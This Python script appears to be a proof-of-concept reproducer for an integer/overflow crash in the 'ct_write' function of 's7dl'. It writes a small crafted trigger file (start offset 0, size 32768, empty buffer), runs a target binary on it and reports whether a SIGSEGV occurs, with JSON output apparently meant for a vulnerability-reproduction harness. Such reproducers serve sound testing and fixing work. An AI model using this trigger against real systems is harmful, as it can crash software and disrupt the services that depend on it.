#!/usr/bin/env python3
"""Single-run PoC for s7dl ct_write integer/overflow trigger.

The trigger is constructed at runtime as:
    0..4 : little-endian signed i32 start offset
    4..8 : little-endian signed i32 transfer size
    8..  : caller data buffer

The chosen parameters make ct_write attempt to transfer from an empty caller
buffer, causing a deterministic SIGSEGV.
"""

import argparse
import json
import os
import signal
import struct
import subprocess
import tempfile
import time


def build_payload():
    start = 0
    size = 32768
    data = b""
    return struct.pack("<ii", start, size) + data


def decode_output(data):
    if data is None:
        return ""
    return data.decode("utf-8", errors="replace")


def signal_name(returncode):
    if returncode is None or returncode >= 0:
        return None
    try:
        return signal.Signals(-returncode).name
    except ValueError:
        return f"SIGNAL_{-returncode}"


def make_observable(returncode, signame, stdout, stderr, timed_out):
    combined = "\n".join(part for part in (stdout.strip(), stderr.strip()) if part)
    if timed_out:
        return {
            "kind": "custom",
            "value": "timeout" if not combined else f"timeout\n{combined}",
            "path": None,
        }
    if returncode is not None and returncode < 0:
        label = signame or f"signal {returncode}"
        value = f"{label} (returncode {returncode})"
        if combined:
            value = f"{value}\n{combined}"
        return {
            "kind": "crash_trace",
            "value": value,
            "path": None,
        }
    return {
        "kind": "combined_output",
        "value": combined,
        "path": None,
    }


def main():
    parser = argparse.ArgumentParser(description="s7dl deterministic PoC trigger")
    parser.add_argument("--binary", required=True, help="path to target binary")
    parser.add_argument("--json-out", default=None, help="optional JSON output path")
    parser.add_argument("--timeout", type=float, default=30.0, help="run timeout in seconds")
    args = parser.parse_args()

    binary = args.binary
    timeout = args.timeout
    payload = build_payload()

    command = [binary]
    trigger_path = None
    setup_error = None

    try:
        fd, trigger_path = tempfile.mkstemp(prefix="s7dl-trigger-", suffix=".bin")
        with os.fdopen(fd, "wb") as trigger_file:
            trigger_file.write(payload)
        command = [binary, trigger_path]
    except Exception as exc:
        setup_error = f"trigger setup failed: {exc}"

    returncode = None
    signame = None
    timed_out = False
    stdout_bytes = b""
    stderr_bytes = b""
    error = setup_error
    start_time = time.monotonic()

    if setup_error is None:
        try:
            completed = subprocess.run(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=timeout,
                check=False,
            )
            returncode = completed.returncode
            stdout_bytes = completed.stdout
            stderr_bytes = completed.stderr
        except subprocess.TimeoutExpired as exc:
            timed_out = True
            stdout_bytes = exc.stdout or b""
            stderr_bytes = exc.stderr or b""
            error = f"timed out after {timeout:g}s"
        except FileNotFoundError as exc:
            error = f"binary not found: {exc}"
        except Exception as exc:
            error = f"run failed: {exc}"
        finally:
            if trigger_path is not None:
                try:
                    os.unlink(trigger_path)
                except FileNotFoundError:
                    pass

    runtime_ms = int((time.monotonic() - start_time) * 1000)
    stdout = decode_output(stdout_bytes)
    stderr = decode_output(stderr_bytes)
    signame = signal_name(returncode)

    if error is None and not timed_out and returncode != -11:
        error = f"target did not produce SIGSEGV (returncode={returncode})"

    result = {
        "binary": binary,
        "command": command,
        "returncode": returncode,
        "signal": signame,
        "timed_out": timed_out,
        "runtime_ms": runtime_ms,
        "stdout": stdout,
        "stderr": stderr,
        "observable": make_observable(returncode, signame, stdout, stderr, timed_out),
        "error": error,
    }

    json_text = json.dumps(result, indent=2)
    print(json_text)

    if args.json_out:
        with open(args.json_out, "w", encoding="utf-8") as out_file:
            out_file.write(json_text)
            out_file.write("\n")


if __name__ == "__main__":
    main()
